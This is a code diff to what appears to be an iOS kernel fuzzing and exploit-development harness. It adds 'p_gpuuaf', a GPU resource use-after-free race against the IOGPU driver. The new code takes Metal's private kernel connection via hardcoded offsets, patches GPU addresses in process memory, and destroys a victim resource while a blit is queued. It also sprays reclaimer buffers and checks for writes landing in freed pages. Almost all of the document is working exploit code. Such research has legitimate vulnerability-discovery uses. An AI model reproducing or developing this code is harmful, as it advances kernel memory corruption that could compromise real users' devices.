@@ -21,6 +21,7 @@
 #include <Foundation/Foundation.h>
 #include <UIKit/UIKit.h>
 #include <objc/runtime.h>
+#include <objc/message.h>
 #include <sys/mman.h>
 #include <stdarg.h>
 
@@ -16640,6 +16641,160 @@ static void p_groom(void) {
     LOG("[groom] done (alive)");
 }
 
+// V105: GPU resource UAF race. (0) destroy-path probe: trap1 sel1 rid (macOS
+// trace: Trap1 sel1 per-rid after submit). (1) stall race: blit A->V held on
+// MTLSharedEvent, free V while stalled, then signal. (2) same + spray of our
+// gpu_resource2 buffers. Readback via the v90 read primitive.
+static void p_gpuuaf(void) {
+    int step = atoi(getenv("FUZZ_GPUUAF_STEP") ?: "1");
+    LOG("[guaf] v105 step %d", step);
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+
+    if (step == 0) {
+        // destroy-path probe on our type-1 conn
+        uint64_t g1 = 0, g2 = 0;
+        uint8_t *p1 = NULL, *p2 = NULL;
+        uint32_t r1 = gpu_resource2(c, 0x10000, &g1, &p1);
+        LOG("[guaf] res1 rid %u gpuva %llx cpu %p", r1, g1, p1);
+        if (!r1) return;
+        memset(p1, 0x77, 0x10000);
+        // candidate destroy forms
+        kern_return_t k1 = ioconnect_trap1(c, 1, r1);
+        LOG("[guaf] trap1 sel1 rid %u -> kr 0x%08x", r1, k1);
+        // probe: alloc again — same GPUVA means freed
+        uint32_t r2 = gpu_resource2(c, 0x10000, &g2, &p2);
+        LOG("[guaf] res2 rid %u gpuva %llx (res1 was %llx) — %s", r2, g2, g1,
+            g2 == g1 ? "GPUVA REUSED => freed" : "different");
+        // CPU-side liveness of the old mapping (may fault the process)
+        LOG("[guaf] touching old cpu ptr (may crash)...");
+        fsync(fileno(stderr));
+        volatile uint8_t v = p1[0];
+        LOG("[guaf] old cpu ptr[0] = 0x%02x (mapping still alive)", v);
+        // scalar-form destroy candidates on a fresh resource
+        for (uint32_t sel = 16; sel <= 24; sel++) {
+            uint64_t a[1] = { r2 };
+            kern_return_t kk = IOConnectCallScalarMethod(c, sel, a, 1, NULL, NULL);
+            LOG("[guaf] scalar sel %u {rid} -> kr 0x%08x", sel, kk);
+        }
+        LOG("[guaf] step0 done (alive)");
+        return;
+    }
+
+    // steps 1..3: congested-queue race. No stall API on iOS 27 classic
+    // encoders — instead: flood the queue with long blits, queue the victim
+    // blit (dest patched to a raw resource V on Metal's conn), then destroy V
+    // via trap1 while it sits in the queue. Readback via V's CPU ptr (freed
+    // mappings stay readable per step 0).
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    if (!dev || !mq) return;
+    // Metal's IOGPU connection (v86 technique)
+    uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+    uint8_t *dref = devObj ? *(uint8_t **)(devObj + 656) : NULL;
+    io_connect_t mconn = dref ? *(uint32_t *)(dref + 0x14) : 0;
+    LOG("[guaf] Metal conn 0x%x", mconn);
+    if (!mconn) return;
+    // congestion: 8x16MB copies queued (not waited)
+    id<MTLBuffer> cgS = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> cgD = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+    memset([cgS contents], 0x55, 0x1000000);
+    for (int i = 0; i < 8; i++) {
+        id<MTLCommandBuffer> cb = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+        [enc copyFromBuffer:cgS sourceOffset:0 toBuffer:cgD destinationOffset:0 size:0x1000000];
+        [enc endEncoding];
+        [cb commit];
+    }
+    // victim raw resource on Metal's conn
+    uint64_t gv = 0;
+    uint8_t *cv = NULL;
+    uint32_t ridV = gpu_resource2(mconn, 0x10000, &gv, &cv);
+    LOG("[guaf] victim rid %u gpuva 0x%llx cpu %p", ridV, gv, cv);
+    if (!ridV || !cv) return;
+    memset(cv, 0, 0x10000);
+    // victim blit: Metal copy A->D, dest patched to V (v89 mechanics)
+    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bufD = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    memset([bufA contents], 0x41, 0x10000);
+    id<MTLCommandBuffer> cb = [mq commandBuffer];
+    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+    [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufD destinationOffset:0 size:0x10000];
+    [enc endEncoding];
+    uint64_t gpuD = [bufD gpuAddress];
+    // pool slots: every gpuD -> gv (full VM scan, one-off)
+    long np = 0;
+    {
+        mach_vm_address_t addr = 0;
+        while (1) {
+            mach_vm_size_t sz = 0;
+            vm_region_basic_info_data_64_t info;
+            mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+            mach_port_t obj;
+            if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                               (vm_region_info_t)&info, &cnt, &obj)) break;
+            if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
+                uint8_t *base = (uint8_t *)addr;
+                for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4)
+                    if (*(uint64_t *)(base + o) == gpuD) { *(uint64_t *)(base + o) = gv; np++; }
+            }
+            addr += sz;
+            if (!sz) break;
+        }
+    }
+    // seglist residency: rid of D -> ridV (count-2 group, sizeKB 0x40)
+    void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+    uint64_t sva = storage ? *(uint64_t *)((uint8_t *)storage + 0x68) : 0;
+    int ridpatch = 0;
+    if (sva) {
+        uint8_t *sg = (uint8_t *)(uintptr_t)sva;
+        for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
+            if (*(uint16_t *)(sg + o + 0x3e) == 2 &&
+                *(uint32_t *)(sg + o + 0x18) == 0x40 && *(uint32_t *)(sg + o + 0x1c) == 0x40) {
+                *(uint32_t *)(sg + o + 0x04) = ridV;
+                ridpatch = 1;
+            }
+        }
+    }
+    LOG("[guaf] patched %ld slots + rid(%d) — committing, then destroy", np, ridpatch);
+    [cb commit];
+    // destroy the victim while the blit sits in the congested queue
+    fsync(fileno(stderr));
+    kern_return_t kd = ioconnect_trap1(mconn, 1, ridV);
+    LOG("[guaf] destroy rid %u -> kr 0x%08x (blit in flight)", ridV, kd);
+    if (step >= 2) {
+        // spray reclaimers (our conn — same physical pool)
+        uint64_t sg; uint8_t *sp = NULL;
+        uint8_t *spray[8];
+        for (int i = 0; i < 8; i++) {
+            uint32_t rr = gpu_resource2(c, 0x10000, &sg, &sp);
+            spray[i] = rr ? sp : NULL;
+            if (spray[i]) memset(spray[i], 0x22, 0x10000);
+        }
+        LOG("[guaf] sprayed 8 reclaimers");
+        usleep(300000);
+        for (int i = 0; i < 8; i++) {
+            if (!spray[i]) continue;
+            long n41 = 0;
+            for (int j = 0; j < 0x10000; j++) if (spray[i][j] == 0x41) n41++;
+            if (n41) LOG("[guaf] *** spray[%d] has %ld 0x41 bytes — UAF WRITE INTO RECLAIMED PAGE ***", i, n41);
+        }
+    }
+    // drain: poll cb status (waitUntilCompleted may kill us on fault)
+    for (int w = 0; w < 40; w++) {
+        long st = (long)[cb status];
+        if (st >= 4) { LOG("[guaf] cb status %ld (completed/error)", st); break; }
+        if (w == 39) LOG("[guaf] cb status %ld after 2s (still queued?)", st);
+        usleep(50000);
+    }
+    // readback victim's (freed) CPU mapping
+    long n41 = 0, nz = 0;
+    for (int i = 0; i < 0x10000; i++) { if (cv[i] == 0x41) n41++; if (cv[i]) nz++; }
+    LOG("[guaf] victim cpu readback: 0x41 %ld nz %ld %s", n41, nz,
+        n41 > 0x8000 ? "*** WRITE LANDED AFTER DESTROY ***" : nz ? "(nonzero — reused)" : "(zeros)");
+    LOG("[guaf] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -16770,6 +16925,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GROOM")) { p_groom(); LOG("[probe13] groom-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPROOF")) { p_xproof(); LOG("[probe13] xproof-only mode, stop"); return NULL; }
         if (getenv("FUZZ_OVERRUN")) { p_overrun(); LOG("[probe13] overrun-only mode, stop"); return NULL; }
